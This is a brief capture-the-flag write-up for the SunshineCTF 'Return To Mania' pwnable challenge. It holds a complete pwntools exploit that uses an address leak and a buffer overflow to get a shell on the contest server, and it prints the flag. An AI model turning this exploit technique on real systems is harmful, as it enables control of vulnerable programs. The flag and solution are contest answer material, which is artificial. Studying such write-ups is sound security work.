# **Return To Mania**

#### tag : pwnable

-----------------------------------------------

#### Description

>To celebrate her new return to wrestling, Captn Overflow authored this challenge to enter the ring
>
>nc ret.sunshinectf.org 4301
>
>Author: bambu

-----------------------------------------------

#### Solution

```python
from pwn import *

r = remote('ret.sunshinectf.org', 4301)

# leak shell address by calculating offset
r.recvuntil(': ')
leak = int(r.recvuntil('\n')[:-1],16)
leak2 = leak - (0x6ed - 0x65d)

# simple buffer over flow
r.sendline('a' * 0x16 + p32(leak2))
r.interactive()
```
**sun{0V3rfl0w_rUn_w!Ld_br0th3r}**
